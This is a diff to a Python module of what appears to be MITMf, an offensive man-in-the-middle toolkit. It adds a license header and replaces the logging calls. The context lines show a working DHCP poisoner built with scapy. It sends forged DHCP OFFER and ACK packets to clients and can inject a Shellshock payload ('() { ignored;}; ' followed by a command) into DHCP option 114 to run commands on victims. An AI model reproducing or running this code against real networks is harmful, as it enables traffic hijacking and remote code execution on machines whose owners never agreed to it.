@@ -1,12 +1,30 @@
+# Copyright (c) 2014-2016 Marcello Salvati
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 3 of the
+# License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+# USA
+#
+
 import logging
 import threading
 import binascii
 import random
-
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
+from core.logger import logger
 from scapy.all import *
 
-mitmf_logger = logging.getLogger('mitmf')
+formatter = logging.Formatter("%(asctime)s [DHCPpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logger().setup_logger("DHCPpoisoner", formatter)
 
 class DHCPpoisoner():
 
@@ -55,8 +73,8 @@ class DHCPpoisoner():
 				self.dhcp_dic[xid] = client_ip
 
 			if resp[DHCP].options[0][1] is 1:
-				mitmf_logger.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
-				mitmf_logger.info("Sending DHCP OFFER")
+				log.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
+				log.info("Sending DHCP OFFER")
 				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
 				IP(src=self.ip_address, dst='255.255.255.255') /
 				UDP(sport=67, dport=68) /
@@ -78,7 +96,7 @@ class DHCPpoisoner():
 				sendp(packet, iface=self.interface, verbose=self.debug)
 
 			if resp[DHCP].options[0][1] is 3:
-				mitmf_logger.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
+				log.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
 				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
 				IP(src=self.ip_address, dst='255.255.255.255') /
 				UDP(sport=67, dport=68) /
@@ -97,11 +115,11 @@ class DHCPpoisoner():
 					pass
 
 				if self.shellshock:
-					mitmf_logger.info("Sending DHCP ACK with shellshock payload")
+					log.info("Sending DHCP ACK with shellshock payload")
 					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
 					packet[DHCP].options.append("end")
 				else:
-					mitmf_logger.info("Sending DHCP ACK")
+					log.info("Sending DHCP ACK")
 					packet[DHCP].options.append("end")
 
 				sendp(packet, iface=self.interface, verbose=self.debug)
